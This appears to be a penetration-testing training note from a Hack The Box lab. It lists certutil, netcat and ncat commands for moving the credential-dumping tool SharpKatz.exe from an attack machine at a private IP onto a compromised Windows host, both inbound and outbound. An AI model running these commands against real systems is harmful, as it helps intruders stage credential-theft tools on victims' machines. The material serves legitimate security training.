# Miscellaneous File Transfer Methods

## Certutil

```pwsh
PS C:\Users\htb-student> certutil.exe -urlcache -split -f "http://10.10.14.229:8080/SharpKatz.exe" SharpKatz.exe
```

## Inbound Connections to Compromised Machine

### Listening on Compromised Machine to Receive

=== "NETCAT"

    ```pwsh
    PS C:\Users\htb-student> nc.exe -lvnp 8000 > SharpKatz.exe
    ```

=== "NCAT"

    ```pwsh
    PS C:\Users\htb-student> ncat.exe -lvnp 8000 --recv-only > SharpKatz.exe
    ```

### Connecting from Attack Machine to Send

=== "NETCAT"

    ```sh
    my@attack:~$ nc 10.129.201.55 8000 -q 0 < SharpKatz.exe
    ```

=== "NCAT"

    ```sh
    my@attack:~$ ncat 10.129.201.55 8000 --send-only < SharpKatz.exe
    ```

## Outbound Connections from Compromised Machine

### Listening on Attack Machine to Send

=== "NETCAT"

    ```sh
    my@attack:~$ sudo nc -lvnp 443 -q 0 < SharpKatz.exe
    ```

=== "NCAT"

    ```sh
    my@attack:~$ sudo ncat -lvnp 443 --send-only < SharpKatz.exe
    ```

### Connecting from Compromised Machine to Receive

=== "NETCAT"

    ```pwsh
    PS C:\Users\htb-student> nc.exe 10.10.14.229 443 > SharpKatz.exe
    ```

=== "NCAT"

    ```pwsh
    PS C:\Users\htb-student> ncat.exe 10.10.14.229 443 --recv-only > SharpKatz.exe
    ```
